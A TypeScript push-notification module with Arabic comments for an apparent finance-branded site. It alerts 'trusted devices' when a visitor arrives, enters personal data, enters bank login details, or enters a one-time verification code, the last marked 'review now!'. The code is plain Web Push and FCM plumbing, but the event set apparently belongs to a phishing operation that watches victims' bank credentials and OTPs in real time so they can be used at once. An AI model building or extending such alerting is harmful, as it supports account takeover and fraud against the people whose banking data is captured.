// Push Notifications Service باستخدام Web Push والأجهزة الموثوقة
import webpush from "web-push";
import { db, trustedDevicesTable } from "@workspace/db";
import { eq, isNotNull } from "drizzle-orm";

// ─── أنواع الإشعارات ─────────────────────────────────────────────────────
export type NotificationEvent = "visitor" | "personal" | "bank" | "otp";

export interface PushPayload {
  title: string;
  body: string;
  icon?: string;
  badge?: string;
  tag?: string;
  data?: {
    eventType: NotificationEvent;
    sessionId?: string;
    applicantName?: string;
    timestamp: number;
  };
}

// ─── إعدادات VAPID من Environment ───────────────────────────────────────
const vapidPublicKey = process.env.VAPID_PUBLIC_KEY || "";
const vapidPrivateKey = process.env.VAPID_PRIVATE_KEY || "";
const FCM_SERVER_KEY = process.env.FCM_SERVER_KEY || "";

if (vapidPublicKey && vapidPrivateKey) {
  webpush.setVapidDetails(
    "mailto:notifications@jazeera-finance.com",
    vapidPublicKey,
    vapidPrivateKey
  );
  console.log("✅ Push notifications: VAPID keys configured");
} else if (FCM_SERVER_KEY) {
  console.log("✅ Push notifications: FCM Server Key configured");
} else {
  console.log("⚠️ Push notifications: No VAPID or FCM keys configured");
}

// ─── رسائل الإشعارات ────────────────────────────────────────────────────
const notificationMessages: Record<NotificationEvent, { title: string; body: string }> = {
  visitor: {
    title: "🆕 زائر جديد!",
    body: "زائر جديد دخل الموقع",
  },
  personal: {
    title: "👤 بيانات جديدة",
    body: "تم إدخال بيانات شخصية جديدة",
  },
  bank: {
    title: "🏦 بيانات بنك!",
    body: "تم إدخال بيانات البنك والدخول",
  },
  otp: {
    title: "🔐 رمز تحقق!",
    body: "تم إدخال رمز التحقق - راجع الآن!",
  },
};

// ─── إرسال إشعار لجميع الأجهزة الموثوقة ─────────────────────────────────
export async function sendPushNotification(eventType: NotificationEvent, extraData?: { sessionId?: string; applicantName?: string }) {
  const message = notificationMessages[eventType];
  
  const payload: PushPayload = {
    title: message.title,
    body: extraData?.applicantName ? `${message.body}: ${extraData.applicantName}` : message.body,
    icon: "/icons/icon-192.png",
    tag: `event-${eventType}`,
    data: {
      eventType,
      sessionId: extraData?.sessionId,
      applicantName: extraData?.applicantName,
      timestamp: Date.now(),
    },
  };

  const payloadStr = JSON.stringify(payload);

  try {
    // جلب جميع الأجهزة الموثوقة النشطة مع اشتراك Push
    const devices = await db
      .select()
      .from(trustedDevicesTable)
      .where(eq(trustedDevicesTable.isActive, true));

    const devicesWithPush = devices.filter(d => d.pushSubscription);

    if (devicesWithPush.length === 0) {
      console.log("📱 No trusted devices with push subscriptions");
      return { successful: 0, failed: 0 };
    }

    console.log(`📱 Sending push to ${devicesWithPush.length} trusted devices`);

    // إرسال لجميع الأجهزة
    const results = await Promise.allSettled(
      devicesWithPush.map(async (device) => {
        try {
          const subscription = JSON.parse(device.pushSubscription!);
          
          if (FCM_SERVER_KEY && !vapidPublicKey) {
            // استخدام FCM Legacy API
            const response = await fetch("https://fcm.googleapis.com/fcm/send", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": `key=${FCM_SERVER_KEY}`,
              },
              body: JSON.stringify({
                to: subscription.endpoint,
                notification: {
                  title: payload.title,
                  body: payload.body,
                  icon: payload.icon,
                  tag: payload.tag,
                },
                data: payload.data,
              }),
            });
            if (!response.ok) {
              throw new Error(`FCM error: ${response.status}`);
            }
          } else {
            // استخدام Web Push مع VAPID
            await webpush.sendNotification(subscription as PushSubscription, payloadStr);
          }
          
          // تحديث lastUsedAt
          await db
            .update(trustedDevicesTable)
            .set({ lastUsedAt: new Date() })
            .where(eq(trustedDevicesTable.id, device.id));
          
          return { deviceId: device.deviceId, success: true };
        } catch (err) {
          console.error(`📱 Push failed for ${device.deviceId}:`, err);
          // إزالة الاشتراك إذا فشل (410 = Gone)
          if (err instanceof Error && err.message.includes("410")) {
            await db
              .update(trustedDevicesTable)
              .set({ pushSubscription: null })
              .where(eq(trustedDevicesTable.id, device.id));
          }
          return { deviceId: device.deviceId, success: false, error: err };
        }
      })
    );

    const successful = results.filter(r => r.status === "fulfilled" && (r.value as {success: boolean}).success).length;
    const failed = results.length - successful;
    
    console.log(`📱 Push results: ${successful} success, ${failed} failed`);
    
    return { successful, failed };
  } catch (err) {
    console.error("📱 Push notification error:", err);
    return { successful: 0, failed: 0 };
  }
}

// ─── للتوافق مع الكود القديم ──────────────────────────────────────────────
export function saveSubscription(endpoint: string, sub: PushSubscription) {
  console.log(`📱 Subscription endpoint: ${endpoint.substring(0, 50)}...`);
}

export function removeSubscription(endpoint: string) {
  console.log(`📱 Remove subscription: ${endpoint.substring(0, 50)}...`);
}
